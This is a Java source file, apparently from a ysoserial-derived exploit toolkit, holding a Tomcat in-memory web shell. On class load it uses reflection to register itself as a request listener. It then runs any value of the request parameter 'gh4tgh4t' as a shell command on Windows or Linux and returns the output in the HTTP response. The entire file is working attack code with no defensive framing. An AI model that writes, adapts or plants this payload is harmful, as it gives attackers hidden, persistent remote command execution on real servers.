package ysoserial.bullet.template.tomcat;

import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.connector.Request;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

public class TomcatListener implements ServletRequestListener {
    private  static String param = "gh4tgh4t";

    static {
        try{
            Runtime.getRuntime().exec("calc");
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Field resourcesF = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
            resourcesF.setAccessible(true);
            WebResourceRoot resources = (WebResourceRoot) resourcesF.get(webappClassLoaderBase);
            StandardContext standardContext = (StandardContext) resources.getContext();

            standardContext.addApplicationEventListener(new TomcatListener());
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
        String string = req.getParameter(this.param);
        if (string != null){
            InputStream in = null;
            try {
                String osName = System.getProperty("os.name");
                String[] cmd = osName != null && osName.toLowerCase().contains("win") ? new String[]{"cmd.exe","/c",string} : new String[]{"/bin/bash","-c",string};
                in = Runtime.getRuntime().exec(cmd).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String out = s.hasNext()?s.next():"";
                Field requestF = req.getClass().getDeclaredField("request");
                requestF.setAccessible(true);
                Request request = (Request)requestF.get(req);
                request.getResponse().getWriter().write(out);
            }
            catch (IOException e) {}
            catch (NoSuchFieldException e) {}
            catch (IllegalAccessException e) {}
        }
    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {

    }
}
